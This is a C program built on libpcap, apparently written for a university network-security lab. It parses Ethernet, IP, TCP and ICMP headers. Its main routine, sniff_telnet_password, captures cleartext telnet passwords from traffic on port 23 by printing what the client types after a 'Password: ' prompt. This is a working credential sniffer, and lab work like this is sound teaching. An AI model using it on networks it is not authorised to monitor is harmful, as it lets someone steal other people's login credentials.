#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6

/* Ethernet header */
struct sniff_ethernet {
    u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
    u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
    u_short ether_type; /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
    u_char ip_vhl;		    /* version << 4 | header length >> 2 */
    u_char ip_tos;		    /* type of service */
    u_short ip_len;		    /* total length */
    u_short ip_id;		    /* identification */
    u_short ip_off;		    /* fragment offset field */
#define IP_RF 0x8000		/* reserved fragment flag */
#define IP_DF 0x4000		/* don't fragment flag */
#define IP_MF 0x2000		/* more fragments flag */
#define IP_OFFMASK 0x1fff	/* mask for fragmenting bits */
    u_char ip_ttl;	    	/* time to live */
    u_char ip_p;		    /* protocol */
    u_short ip_sum;	    	/* checksum */
    struct in_addr ip_src,ip_dst;  /* source and dest address */
    //u_int32_t ip_src;
    //u_int32_t ip_dst;
};
#define IP_HL(ip)       (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)		(((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
    u_short th_sport;	/* source port */
    u_short th_dport;	/* destination port */
    tcp_seq th_seq;		/* sequence number */
    tcp_seq th_ack;		/* acknowledgement number */
    u_char th_offx2;	/* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
    u_char th_flags;
#define TH_FIN 0x01
#define TH_SYN 0x02
#define TH_RST 0x04
#define TH_PUSH 0x08
#define TH_ACK 0x10
#define TH_URG 0x20
#define TH_ECE 0x40
#define TH_CWR 0x80
#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
    u_short th_win;		/* window */
    u_short th_sum;		/* checksum */
    u_short th_urp;		/* urgent pointer */
};

/* ICMP Header */
#define ICMP_ECHOREPLY          0        /* Echo Reply                        */
#define ICMP_DEST_UNREACH       3        /* Destination Unreachable        */
#define ICMP_SOURCE_QUENCH      4        /* Source Quench                */
#define ICMP_REDIRECT           5        /* Redirect (change route)        */
#define ICMP_ECHO               8        /* Echo Request                        */
#define ICMP_TIME_EXCEEDED      11        /* Time Exceeded                */
#define ICMP_PARAMETERPROB      12        /* Parameter Problem                */
#define ICMP_TIMESTAMP          13        /* Timestamp Request                */
#define ICMP_TIMESTAMPREPLY     14        /* Timestamp Reply                */
#define ICMP_INFO_REQUEST       15        /* Information Request                */
#define ICMP_INFO_REPLY         16        /* Information Reply                */
#define ICMP_ADDRESS            17        /* Address Mask Request                */
#define ICMP_ADDRESSREPLY       18        /* Address Mask Reply                */
#define NR_ICMP_TYPES           18
struct sniff_icmp {
	u_int8_t   type;
	u_int8_t   code;                 // Type sub code
	u_int16_t checksum;             
	union {                         /* content */
        struct {
            u_int16_t        id;
            u_int16_t        sequence;
        } echo;                        /* echo datagram */
        u_int32_t        gateway;        /* gateway address */
        struct {
            u_int16_t        __unused;
            u_int16_t        mtu;
        } frag;                        /* path mtu discovery */
    } un;
};

/* ethernet headers are always exactly 14 bytes */
#define SIZE_ETHERNET 14

/* define protocol types */
#define PROTO_ICMP 1

/* This function will be invoked by pcap for each captured packet.
We can process each packet inside the function. */
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    /*
        struct pcap_pkthdr {
            struct timeval ts; // time stamp 
            bpf_u_int32 caplen; // length of portion present 
            bpf_u_int32 len; // length this packet (off wire) 
        };
    */
    printf("Got a packet\n");
	const struct sniff_ethernet *ethernet; /* The ethernet header */
	const struct sniff_ip *ip; /* The IP header */
	const struct sniff_tcp *tcp; /* The TCP header */
    const struct sniff_icmp *icmp; /* The ICMP header */
	const char *payload; /* Packet payload */

	u_int size_ip;
	u_int size_tcp;
    
    ethernet = (struct sniff_ethernet*)(packet);
    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip)*4;
    if (size_ip < 20) {
        printf("   * Invalid IP header length: %u bytes\n", size_ip);
        return;
    }
    printf("\tsrc: %s\n", inet_ntoa(ip->ip_src));
    printf("\tdst: %s\n", inet_ntoa(ip->ip_dst));
    // check protocol type:
    if (ip->ip_p == PROTO_ICMP) {
        icmp = (struct sniff_icmp*)(packet + SIZE_ETHERNET + size_ip);
        if (icmp->type == ICMP_ECHO) {
            printf("\tICMP echo request\n");
        } else if (icmp->type == ICMP_ECHOREPLY) {
            printf("\tICMP echo reply\n");
        }
    }
    else {
        tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
        size_tcp = TH_OFF(tcp)*4;
        if (size_tcp < 20) {
            printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
            return;
        }
        payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
        printf("\t%s",payload);
    }
    printf("\n");
}

u_short leak = 0;
struct in_addr server_addr, client_addr;


/* Sniff telnet passwords sent through the net */
void sniff_telnet_password(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
	const struct sniff_ethernet *ethernet; /* The ethernet header */
	const struct sniff_ip *ip; /* The IP header */
	const struct sniff_tcp *tcp; /* The TCP header */
    const struct sniff_icmp *icmp; /* The ICMP header */
	const char *payload; /* Packet payload */

	u_int size_ip;
	u_int size_tcp;
    
    ethernet = (struct sniff_ethernet*)(packet);
    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip)*4;
    if (size_ip < 20) {
        printf("   * Invalid IP header length: %u bytes\n", size_ip);
        return;
    }
    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp)*4;
    if (size_tcp < 20) {
        printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
        return;
    }
    payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
    //fprintf(stderr,"[%s]\n",payload);
    
    if (strcmp(payload,"Password: ") == 0){
        printf("Start leaking password: ");
        leak = 1;
        // src and dst are exchanged here since the password is wrote from the other user
        client_addr = ip->ip_dst;
        server_addr = ip->ip_src;
    // \r is used to close the exchange of password (it is the last "Enter")
    } else if (client_addr.s_addr == ip->ip_src.s_addr && server_addr.s_addr == ip->ip_dst.s_addr && leak == 1 && strcmp(payload,"\r")==0){ 
        printf("\nDone!\n");
        leak = 0;
    } else if (client_addr.s_addr == ip->ip_src.s_addr && server_addr.s_addr == ip->ip_dst.s_addr && leak == 1){
        printf("%s",payload);
    }
    fflush(stdout);
}

int main() {
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char filter_exp[] = "tcp port 23"; // telnet
    //char filter_exp[] = "icmp and (host 10.9.0.5 and host 10.9.0.6)"; // only ping between two hosts 
    bpf_u_int32 net;
    // Step 1: Open live pcap session on NIC with name eth3.
    // Students need to change "eth3" to the name found on their own
    // machines (using ifconfig). The interface to the 10.9.0.0/24
    // network has a prefix "br-" (if the container setup is used).
    char dev[] = "br-5de3b839fd4f";
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
		 fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		 return(EXIT_FAILURE);
	 }
    // Step 2: Compile filter_exp into BPF psuedo-code
    pcap_compile(handle, &fp, filter_exp, 0, net);
    if (pcap_setfilter(handle, &fp) !=0) {
		 fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		 return(EXIT_FAILURE);
	 }
    // Step 3: Capture packets
    //pcap_loop(handle, -1, got_packet, NULL);
    pcap_loop(handle, -1, sniff_telnet_password, NULL);
    pcap_close(handle); //Close the handle
    return 0;
}

// Note: don’t forget to add "-lpcap" to the compilation command.
// For example: gcc -o sniff sniff.c -lpcap